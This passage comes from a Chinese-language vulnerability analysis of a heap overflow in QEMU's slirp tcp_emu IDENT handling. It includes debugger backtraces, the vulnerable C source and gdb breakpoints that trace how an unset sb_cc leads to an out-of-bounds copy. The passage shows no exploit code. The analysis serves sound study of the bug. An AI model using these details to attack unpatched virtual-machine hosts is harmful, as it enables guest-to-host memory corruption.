e1000_mmio_write (opaque=0x56279100fd00, addr=0x3818, val=0x22, size=0x4)</span></span><br><span class="line">    at /home/wz/qemu/hw/net/e1000.c:1287</span><br><span class="line"><span class="comment">#25 0x000056278dad1991 in memory_region_write_accessor (mr=0x562791012600, addr=0x3818, value=0x7f57cce95f78, size=0x4, shift=0x0, ma</span></span><br><span class="line">sk=0xffffffff, attrs=...) at /home/wz/qemu/memory.c:504</span><br><span class="line"><span class="comment">#26 0x000056278dad1ba1 in access_with_adjusted_size (addr=0x3818, value=0x7f57cce95f78, size=0x4, access_size_min=0x4, access_size_ma</span></span><br><span class="line">x=0x4, access_fn=</span><br><span class="line">    0x56278dad18a8 &lt;memory_region_write_accessor&gt;, mr=0x562791012600, attrs=...) at /home/wz/qemu/memory.c:570</span><br><span class="line"><span class="comment">#27 0x000056278dad489c in memory_region_dispatch_write (mr=0x562791012600, addr=0x3818, data=0x22, size=0x4, attrs=...)</span></span><br><span class="line">    at /home/wz/qemu/memory.c:1452</span><br><span class="line"><span class="comment">#28 0x000056278da6f896 in flatview_write_continue (fv=0x7f57c47e7c00, addr=0xfebc3818, attrs=..., buf=0x7f57ea23d028 "\"", len=0x4, a</span></span><br><span class="line">ddr1=0x3818, l=0x4, mr=0x562791012600)</span><br><span class="line">    at /home/wz/qemu/exec.c:3233</span><br><span class="line"><span class="comment">#29 0x000056278da6f9e0 in flatview_write (fv=0x7f57c47e7c00, addr=0xfebc3818, attrs=..., buf=0x7f57ea23d028 "\"", len=0x4)</span></span><br><span class="line">    at /home/wz/qemu/exec.c:3272</span><br><span class="line"><span class="comment">#30 0x000056278da6fce6 in address_space_write (as=0x56278ea29de0 &lt;address_space_memory&gt;, addr=0xfebc3818, attrs=..., buf=0x7f57ea23d0</span></span><br><span class="line">28 <span class="string">"\""</span>, len=0x4) at /home/wz/qemu/exec.c:3362</span><br><span class="line"><span class="comment">#31 0x000056278da6fd37 in address_space_rw (as=0x56278ea29de0 &lt;address_space_memory&gt;, addr=0xfebc3818, attrs=..., buf=0x7f57ea23d028</span></span><br><span class="line"><span class="string">"\""</span>, len=0x4, is_write=0x1) at /home/wz/qemu/exec.c:3373</span><br><span class="line"><span class="comment">#32 0x000056278daf0c86 in kvm_cpu_exec (cpu=0x5627900b3990)</span></span><br><span class="line">    at /home/wz/qemu/accel/kvm/kvm-all.c:2031</span><br><span class="line"><span class="comment">#33 0x000056278dab6a78 in qemu_kvm_cpu_thread_fn (arg=0x5627900b3990) at /home/wz/qemu/cpus.c:1281</span></span><br><span class="line"><span class="comment">#34 0x000056278e06a004 in qemu_thread_start (args=0x5627900d6710)</span></span><br><span class="line">    at /home/wz/qemu/util/qemu-thread-posix.c:498</span><br><span class="line"><span class="comment">#35 0x00007f57e46c16db in start_thread (arg=0x7f57cce99700)</span></span><br><span class="line">    at pthread_create.c:463</span><br><span class="line"><span class="comment">#36 0x00007f57e43ea71f in clone ()</span></span><br><span class="line">    at ../sysdeps/unix/sysv/linux/x86_64/clone.S:95</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure>
<p>查看位于<code>slirp/tcp_subr.c</code>的函数实现，<code>so_rcv</code>的类型为<code>struct sbuf *</code>，它存储的是tcp协议的数据，<code>m</code>的类型为<code>struct mbuf *</code>，它存储的是ip协议的数据，这里的<code>memcpy(so_rcv-&gt;sb_wptr, m-&gt;m_data, m-&gt;m_len);</code>将网络层的数据保存到了传输层中。这两个数据结构的定义如下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sbuf</span> &#123;</span></span><br><span class="line">	<span class="keyword">uint32_t</span> sb_cc;		<span class="comment">/* actual chars in buffer */</span></span><br><span class="line">	<span class="keyword">uint32_t</span> sb_datalen;	<span class="comment">/* Length of data  */</span></span><br><span class="line">	<span class="keyword">char</span>	*sb_wptr;	<span class="comment">/* write pointer. points to where the next</span></span><br><span class="line"><span class="comment">				 * bytes should be written in the sbuf */</span></span><br><span class="line">	<span class="keyword">char</span>	*sb_rptr;	<span class="comment">/* read pointer. points to where the next</span></span><br><span class="line"><span class="comment">				 * byte should be read from the sbuf */</span></span><br><span class="line">	<span class="keyword">char</span>	*sb_data;	<span class="comment">/* Actual data */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> &#123;</span></span><br><span class="line">    <span class="comment">/* XXX should union some of these! */</span></span><br><span class="line">    <span class="comment">/* header at beginning of each mbuf: */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>  <span class="title">mbuf</span> *<span class="title">m_next</span>;</span>       <span class="comment">/* Linked list of mbufs */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>  <span class="title">mbuf</span> *<span class="title">m_prev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>  <span class="title">mbuf</span> *<span class="title">m_nextpkt</span>;</span>    <span class="comment">/* Next packet in queue/record */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>  <span class="title">mbuf</span> *<span class="title">m_prevpkt</span>;</span>    <span class="comment">/* Flags aren't used in the output queue */</span></span><br><span class="line">    <span class="keyword">int</span> m_flags;        <span class="comment">/* Misc flags */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> m_size;         <span class="comment">/* Size of mbuf, from m_dat or m_ext */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>  <span class="title">socket</span> *<span class="title">m_so</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">caddr_t</span> m_data;         <span class="comment">/* Current location of data */</span></span><br><span class="line">    <span class="keyword">int</span> m_len;          <span class="comment">/* Amount of data in this mbuf, from m_data */</span></span><br><span class="line"></span><br><span class="line">    Slirp *slirp;</span><br><span class="line">    <span class="keyword">bool</span>    resolution_requested;</span><br><span class="line">    <span class="keyword">uint64_t</span> expiration_date;</span><br><span class="line">    <span class="keyword">char</span>   *m_ext;</span><br><span class="line">    <span class="comment">/* start of dynamic buffer area, must be last element */</span></span><br><span class="line">    <span class="keyword">char</span>    m_dat[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>当传输的数据中包含有<code>\r|\n</code>时，会对<code>so_rcv-&gt;sb_cc</code>赋值，否则保持其默认值0，我们发送的payload中不包含有<code>\r\n</code>，因此sb_cc不会被赋值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">tcp_emu(struct socket *so, struct mbuf *m)</span><br><span class="line">&#123;</span><br><span class="line">	Slirp *slirp = so-&gt;slirp;</span><br><span class="line">	u_int n1, n2, n3, n4, n5, n6;</span><br><span class="line">        <span class="keyword">char</span> buff[<span class="number">257</span>];</span><br><span class="line">	<span class="keyword">uint32_t</span> laddr;</span><br><span class="line">	u_int lport;</span><br><span class="line">	<span class="keyword">char</span> *bptr;</span><br><span class="line"></span><br><span class="line">	DEBUG_CALL(<span class="string">"tcp_emu"</span>);</span><br><span class="line">	DEBUG_ARG(<span class="string">"so = %p"</span>, so);</span><br><span class="line">	DEBUG_ARG(<span class="string">"m = %p"</span>, m);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span>(so-&gt;so_emu) &#123;</span><br><span class="line">		<span class="keyword">int</span> x, i;</span><br><span class="line"></span><br><span class="line">	 <span class="keyword">case</span> EMU_IDENT:</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Identification protocol as per rfc-1413</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line"></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">tmpso</span>;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">			<span class="keyword">socklen_t</span> addrlen = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">sbuf</span> *<span class="title">so_rcv</span> = &amp;<span class="title">so</span>-&gt;<span class="title">so_rcv</span>;</span></span><br><span class="line"></span><br><span class="line">			<span class="built_in">memcpy</span>(so_rcv-&gt;sb_wptr, m-&gt;m_data, m-&gt;m_len);</span><br><span class="line">			so_rcv-&gt;sb_wptr += m-&gt;m_len;</span><br><span class="line">			so_rcv-&gt;sb_rptr += m-&gt;m_len;</span><br><span class="line">			m-&gt;m_data[m-&gt;m_len] = <span class="number">0</span>; <span class="comment">/* NULL terminate */</span></span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">strchr</span>(m-&gt;m_data, <span class="string">'\r'</span>) || <span class="built_in">strchr</span>(m-&gt;m_data, <span class="string">'\n'</span>)) &#123;</span><br><span class="line">				<span class="keyword">if</span> (<span class="built_in">sscanf</span>(so_rcv-&gt;sb_data, <span class="string">"%u%*[ ,]%u"</span>, &amp;n1, &amp;n2) == <span class="number">2</span>) &#123;</span><br><span class="line">					HTONS(n1);</span><br><span class="line">					HTONS(n2);</span><br><span class="line">					<span class="comment">/* n2 is the one on our host */</span></span><br><span class="line">					<span class="keyword">for</span> (tmpso = slirp-&gt;tcb.so_next;</span><br><span class="line">					     tmpso != &amp;slirp-&gt;tcb;</span><br><span class="line">					     tmpso = tmpso-&gt;so_next) &#123;</span><br><span class="line">						<span class="keyword">if</span> (tmpso-&gt;so_laddr.s_addr == so-&gt;so_laddr.s_addr &amp;&amp;</span><br><span class="line">						    tmpso-&gt;so_lport == n2 &amp;&amp;</span><br><span class="line">						    tmpso-&gt;so_faddr.s_addr == so-&gt;so_faddr.s_addr &amp;&amp;</span><br><span class="line">						    tmpso-&gt;so_fport == n1) &#123;</span><br><span class="line">							<span class="keyword">if</span> (getsockname(tmpso-&gt;s,</span><br><span class="line">								(struct sockaddr *)&amp;addr, &amp;addrlen) == <span class="number">0</span>)</span><br><span class="line">							   n2 = ntohs(addr.sin_port);</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">                so_rcv-&gt;sb_cc = <span class="built_in">snprintf</span>(so_rcv-&gt;sb_data,so_rcv-&gt;sb_datalen,<span class="string">"%d,%d\r\n"</span>, n1, n2);</span><br><span class="line">				so_rcv-&gt;sb_rptr = so_rcv-&gt;sb_data;</span><br><span class="line">				so_rcv-&gt;sb_wptr = so_rcv-&gt;sb_data + so_rcv-&gt;sb_cc;</span><br><span class="line">			&#125;</span><br><span class="line">			m_free(m);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//...</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们继续往下看其调用函数<code>tcp_input</code>，位于<code>slirp/tcp_input.c</code>中。ti为<code>struct tcpiphdr</code>类型的变量，其定义如下。ti_len表示协议长度，由于拷贝之后sb_cc还是为0，因此会使用<code>sbappend(so, m)-&gt;sbappendsb</code>进行追加拷贝，从而造成堆溢出。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sbspace(sb) ((sb)-&gt;sb_datalen - (sb)-&gt;sb_cc)</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Tcp+ip header, after ip options removed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcpiphdr</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mbuf_ptr</span> <span class="title">ih_mbuf</span>;</span>	<span class="comment">/* backpointer to mbuf */</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span>  <span class="title">in_addr</span> <span class="title">ih_src</span>;</span> <span class="comment">/* source internet address */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span>  <span class="title">in_addr</span> <span class="title">ih_dst</span>;</span> <span class="comment">/* destination internet address */</span></span><br><span class="line">            <span class="keyword">uint8_t</span> ih_x1;          <span class="comment">/* (unused) */</span></span><br><span class="line">            <span class="keyword">uint8_t</span> ih_pr;          <span class="comment">/* protocol */</span></span><br><span class="line">        &#125; ti_i4;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span>  <span class="title">in6_addr</span> <span class="title">ih_src</span>;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span>  <span class="title">in6_addr</span> <span class="title">ih_dst</span>;</span></span><br><span class="line">            <span class="keyword">uint8_t</span> ih_x1;</span><br><span class="line">            <span class="keyword">uint8_t</span> ih_nh;</span><br><span class="line">        &#125; ti_i6;</span><br><span class="line">    &#125; ti;</span><br><span class="line">    <span class="keyword">uint16_t</span>    ti_x0;</span><br><span class="line">    <span class="keyword">uint16_t</span>    ti_len;             <span class="comment">/* protocol length */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>      <span class="title">tcphdr</span> <span class="title">ti_t</span>;</span>        <span class="comment">/* tcp header */</span></span><br><span class="line">&#125;;</span><br><span class="line">tcp_input(struct mbuf *m, <span class="keyword">int</span> iphlen, struct socket *inso, <span class="keyword">unsigned</span> <span class="keyword">short</span> af)</span><br><span class="line">&#123;	<span class="comment">//...</span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (ti-&gt;ti_ack == tp-&gt;snd_una &amp;&amp;</span><br><span class="line">				tcpfrag_list_empty(tp) &amp;&amp;</span><br><span class="line">				ti-&gt;ti_len &lt;= sbspace(&amp;so-&gt;so_rcv)) &#123;</span><br><span class="line">				<span class="comment">/*</span></span><br><span class="line"><span class="comment">				* this is a pure, in-sequence data packet</span></span><br><span class="line"><span class="comment">				* with nothing on the reassembly queue and</span></span><br><span class="line"><span class="comment">				* we have enough buffer space to take it.</span></span><br><span class="line"><span class="comment">				*/</span></span><br><span class="line">				tp-&gt;rcv_nxt += ti-&gt;ti_len;</span><br><span class="line">				<span class="comment">/*</span></span><br><span class="line"><span class="comment">				* Add data to socket buffer.</span></span><br><span class="line"><span class="comment">				*/</span></span><br><span class="line">				<span class="keyword">if</span> (so-&gt;so_emu) &#123;</span><br><span class="line">					<span class="keyword">if</span> (tcp_emu(so,m)) sbappend(so, m);</span><br><span class="line">				&#125; <span class="keyword">else</span></span><br><span class="line">					sbappend(so, m);</span><br><span class="line"></span><br><span class="line">				<span class="comment">/*</span></span><br><span class="line"><span class="comment">				* If this is a short packet, then ACK now - with Nagel</span></span><br><span class="line"><span class="comment">				*	congestion avoidance sender won't send more until</span></span><br><span class="line"><span class="comment">				*	he gets an ACK.</span></span><br><span class="line"><span class="comment">				*</span></span><br><span class="line"><span class="comment">				* It is better to not delay acks at all to maximize</span></span><br><span class="line"><span class="comment">				* TCP throughput.  See RFC 2581.</span></span><br><span class="line"><span class="comment">				*/</span></span><br><span class="line">				tp-&gt;t_flags |= TF_ACKNOW;</span><br><span class="line">				tcp_output(tp);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Try and write() to the socket, whatever doesn't get written</span></span><br><span class="line"><span class="comment"> * append to the buffer... for a host with a fast net connection,</span></span><br><span class="line"><span class="comment"> * this prevents an unnecessary copy of the data</span></span><br><span class="line"><span class="comment"> * (the socket is non-blocking, so we won't hang)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">sbappend(struct socket *so, struct mbuf *m)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	DEBUG_CALL(<span class="string">"sbappend"</span>);</span><br><span class="line">	DEBUG_ARG(<span class="string">"so = %p"</span>, so);</span><br><span class="line">	DEBUG_ARG(<span class="string">"m = %p"</span>, m);</span><br><span class="line">	DEBUG_ARG(<span class="string">"m-&gt;m_len = %d"</span>, m-&gt;m_len);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Shouldn't happen, but...  e.g. foreign host closes connection */</span></span><br><span class="line">	<span class="keyword">if</span> (m-&gt;m_len &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">		m_free(m);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If there is urgent data, call sosendoob</span></span><br><span class="line"><span class="comment">	 * if not all was sent, sowrite will take care of the rest</span></span><br><span class="line"><span class="comment">	 * (The rest of this function is just an optimisation)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (so-&gt;so_urgc) &#123;</span><br><span class="line">		sbappendsb(&amp;so-&gt;so_rcv, m);</span><br><span class="line">		m_free(m);</span><br><span class="line">		(<span class="keyword">void</span>)sosendoob(so);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We only write if there's nothing in the buffer,</span></span><br><span class="line"><span class="comment">	 * ottherwise it'll arrive out of order, and hence corrupt</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!so-&gt;so_rcv.sb_cc)</span><br><span class="line">	   ret = slirp_send(so, m-&gt;m_data, m-&gt;m_len, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ret &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Nothing was written</span></span><br><span class="line"><span class="comment">		 * It's possible that the socket has closed, but</span></span><br><span class="line"><span class="comment">		 * we don't need to check because if it has closed,</span></span><br><span class="line"><span class="comment">		 * it will be detected in the normal way by soread()</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		sbappendsb(&amp;so-&gt;so_rcv, m);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ret != m-&gt;m_len) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Something was written, but not everything..</span></span><br><span class="line"><span class="comment">		 * sbappendsb the rest</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		m-&gt;m_len -= ret;</span><br><span class="line">		m-&gt;m_data += ret;</span><br><span class="line">		sbappendsb(&amp;so-&gt;so_rcv, m);<span class="comment">//这里</span></span><br><span class="line">	&#125; <span class="comment">/* else */</span></span><br><span class="line">	<span class="comment">/* Whatever happened, we free the mbuf */</span></span><br><span class="line">	m_free(m);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copy the data from m into sb</span></span><br><span class="line"><span class="comment"> * The caller is responsible to make sure there's enough room</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">sbappendsb(struct sbuf *sb, struct mbuf *m)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> len, n,  nn;</span><br><span class="line"></span><br><span class="line">	len = m-&gt;m_len;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sb-&gt;sb_wptr &lt; sb-&gt;sb_rptr) &#123;</span><br><span class="line">		n = sb-&gt;sb_rptr - sb-&gt;sb_wptr;</span><br><span class="line">		<span class="keyword">if</span> (n &gt; len) n = len;</span><br><span class="line">		<span class="built_in">memcpy</span>(sb-&gt;sb_wptr, m-&gt;m_data, n);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/* Do the right edge first */</span></span><br><span class="line">		n = sb-&gt;sb_data + sb-&gt;sb_datalen - sb-&gt;sb_wptr;</span><br><span class="line">		<span class="keyword">if</span> (n &gt; len) n = len;</span><br><span class="line">		<span class="built_in">memcpy</span>(sb-&gt;sb_wptr, m-&gt;m_data, n);<span class="comment">//这里追加拷贝</span></span><br><span class="line">		len -= n;</span><br><span class="line">		<span class="keyword">if</span> (len) &#123;</span><br><span class="line">			<span class="comment">/* Now the left edge */</span></span><br><span class="line">			nn = sb-&gt;sb_rptr - sb-&gt;sb_data;</span><br><span class="line">			<span class="keyword">if</span> (nn &gt; len) nn = len;</span><br><span class="line">			<span class="built_in">memcpy</span>(sb-&gt;sb_data,m-&gt;m_data+n,nn);</span><br><span class="line">			n += nn;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	sb-&gt;sb_cc += n;</span><br><span class="line">	sb-&gt;sb_wptr += n;</span><br><span class="line">	<span class="keyword">if</span> (sb-&gt;sb_wptr &gt;= sb-&gt;sb_data + sb-&gt;sb_datalen)</span><br><span class="line">		sb-&gt;sb_wptr -= sb-&gt;sb_datalen;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们动态调试一下，验证自己的猜想,断点断到比较和memcpy处.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">directory /home/wz/qemu/slirp/tcp_input.c</span><br><span class="line">b /home/wz/qemu/slirp/tcp_subr.c:638</span><br><span class="line">b /home/wz/qemu/slirp/tcp_input.c:558</span><br></pre></td></tr></table></figure>
<p>可以看到ti_len一直为我们输入的长度0x500，<code>sb_datalen</code>为0x2238的固定值，因为sb_cc为0，因此这里的比较恒成立，故而持续拷贝造成堆溢出。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p *ti</span><br><span class="line"><span class="variable">$2</span> = &#123;</span><br><span class="line">  ih_mbuf = &#123;</span><br><span class="line">    mptr = 0x0</span><br><span class="line">  &#125;,</span><br><span class="line">  ti = &#123;</span><br><span class="line">    ti_i4 = &#123;</span><br><span class="line">      ih_src = &#123;</span><br><span class="line">        s_addr = 0xf02000a</span><br><span class="line">      